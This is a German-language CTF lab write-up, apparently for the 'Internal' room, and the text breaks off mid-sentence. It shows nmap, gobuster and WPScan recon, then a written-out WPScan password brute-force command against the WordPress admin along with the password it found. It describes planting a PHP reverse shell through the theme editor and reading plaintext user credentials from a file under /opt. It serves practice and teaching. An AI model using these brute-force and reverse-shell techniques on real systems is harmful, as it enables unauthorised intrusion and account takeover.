su # Target: 10.10.163.187

# Scanning

## Nmap 

```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

```
- Apache/2.4.29 (Ubuntu)
## Gobuster

```
[+] Url:                     http://internal.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
/wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished

```

- PHP vorhanden 
- Wordpress vorhanden 
	- Enumeration via WPscan

## WPScan

WordPress version 5.4.2 identified

WordPress theme in use: twentyseventeen
 | Location: http://internal.thm/blog/wp-content/themes/twentyseventeen/

### User 
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://internal.thm/blog/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)


## Bruteforcing mit WPScan 

```
wpscan --url internal.thm/blog/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames admin
```

-Combo found 

[!] Valid Combinations Found:
 | Username: admin, Password: my2boys


Intressantes Popup nach anmelden: 
https://imgur.com/Xv0bv4f

# Exploiting

Da wir zugriff auf das Admin Portal haben können wir uns eine Rev Shell geben indem wir auf "Apperance" > Theme Editor > index.php gehen und dort dann eine PHP Rev shell einpflegen. Dann einen Listener starten und die Index page neuladen 

Schon haben wir eine Rev shell


# Priv esc
ich habe linpeas rüber gespielt und info bekommen das in /opt sihc datein befinden (sollte eig leer sein)

kontrolle dieser 

```
www-data@internal:/tmp$ cd /opt
www-data@internal:/opt$ ls
containerd  wp-save.txt
www-data@internal:/opt$ cat wp-save.txt 
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123

```

und schon können wir den user wechseln und die User Flag laden 

Im home Verzeichniss gibt es dann aber noch eine jenkins.txt datei. beim auslesen sehen wir das ein Jenkins Server auf '172.17.0.2:8080' läuft. Aus intresse checken wir mal unsere interne IP und siehe da wir sind im selben netz '172.17.0.1' sprich um jetzt 